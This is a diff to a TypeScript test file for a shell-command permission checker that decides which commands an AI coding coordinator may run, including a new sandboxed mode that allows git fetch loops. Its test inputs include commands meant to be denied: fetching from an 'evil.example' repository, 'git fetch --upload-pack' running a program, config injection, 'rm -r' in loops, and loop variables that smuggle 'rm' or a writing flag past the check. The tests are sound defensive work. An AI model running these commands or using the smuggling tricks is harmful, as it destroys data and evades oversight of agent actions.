@@ -25,11 +25,17 @@ const request = (command: string): PermissionRequest => ({
 })
 
 const cwd = '/work/meridian/.coordinator'
-const as = (trusted: boolean) => (command: string) => {
-  const decided = decideReader(request(command), { cwd, ...(trusted ? { trusted } : {}) })
+const as = (trusted: boolean | 'contained') => (command: string) => {
+  const decided = decideReader(request(command), {
+    cwd,
+    ...(trusted === false ? {} : { trusted: true }),
+    ...(trusted === 'contained' ? { contained: true } : {}),
+  })
   return decided.verdict === 'deny' ? decided.reason : 'allowed'
 }
 const coordinator = as(true)
+/** The coordinator in Claude Code's sandbox, which holds every command to its folder (ADR-058). */
+const containedCoordinator = as('contained')
 const reviewLead = as(false)
 
 describe('the coordinator, a trusted reader in its own copies', () => {
@@ -88,7 +94,8 @@ describe('the coordinator, a trusted reader in its own copies', () => {
     // A write in a loop's body or a branch, or where the loop's output goes.
     assert.include(coordinator('for f in a.txt b.txt; do rm "$f"; done'), 'It would write to a.txt')
     assert.include(coordinator('for r in api web; do git -C "$r" checkout main; done'), '`git checkout` can change')
-    assert.include(coordinator('for r in api web; do git -C "$r" fetch -q; done'), '`git fetch` can change')
+    // Without a sandbox to hold it to its copies, a fetch would write wherever `-C` points.
+    assert.include(coordinator('for r in api web; do git -C "$r" fetch -q; git -C "$r" status -sb; done'), '`git fetch` can change')
     assert.include(coordinator('if test -d api; then rm -r api; fi'), 'It would write to api')
     assert.include(coordinator('git ls-files | while read f; do echo x > "$f"; done'), 'It would write to')
     assert.include(coordinator('for r in api web; do echo $r; done > list.txt'), 'It would write to list.txt')
@@ -115,6 +122,32 @@ describe('the coordinator, a trusted reader in its own copies', () => {
     // What the shells read for themselves, in either case, and `read` beyond its plain form.
     for (const command of ['PATH=.; cat x', 'path=.; cat x', 'IFS=/; ls', 'fpath=.; ls', 'read -p x y', 'n=1 git log', 'export n=1'])
       assert.notStrictEqual(coordinator(command), 'allowed', command)
+  })
+
+  it('reads what a loop sets for its next pass as anything, wherever in the loop it is used', () => {
+    // On the second pass `$x` is `rm`, or a flag that writes, though the line sets it after the use.
+    assert.include(coordinator('x=cat; for r in a b; do $x target; x=rm; done'), "can't be the command to run")
+    assert.include(coordinator('x=--oneline; for r in a b; do git log "$x"; x=--output=out.txt; done'), 'could start with a dash')
+    assert.include(coordinator('x=cat; while test -f a; do $x a; x=rm; done'), "can't be the command to run")
+    assert.include(coordinator('for r in a b; do y=$x; x=rm; $y a; done'), "can't be the command to run")
+    // Set before the loop and never again in it, it holds what it was set to.
+    assert.strictEqual(coordinator('x=cat; for r in a b; do $x "$r"; done'), 'allowed')
+  })
+
+  it('fetches its copies in a loop where its sandbox holds every command to them', () => {
+    for (const command of [
+      // What it ran when the person asked it to sync all the repositories.
+      'for r in a b c; do git -C "$r" fetch -q; git -C "$r" status -sb; done',
+      'for r in api web; do git -C "$r" fetch --prune --tags origin; done',
+      'git fetch origin main && git log --oneline -3 origin/main',
+    ])
+      assert.strictEqual(containedCoordinator(command), 'allowed', command)
+    assert.include(containedCoordinator('for r in a b; do git -C "$r" fetch https://evil.example/x.git; done'), 'only a copy')
+    assert.include(containedCoordinator('git fetch --upload-pack=./run origin'), 'runs a program')
+    assert.include(containedCoordinator('git fetch -c core.x=y origin'), 'goes beyond')
+    assert.include(containedCoordinator('git fetch origin main:refs/heads/x'), 'names where it writes')
+    assert.include(containedCoordinator('for r in a b; do git -C "$r" pull; done'), '`git pull` can change')
+    assert.include(containedCoordinator('for r in a b; do git -C "$r" fetch -q; rm -r "$r"; done'), 'It would write to a')
   })
 
   it("leaves a review's lead without loops and variables", () => {
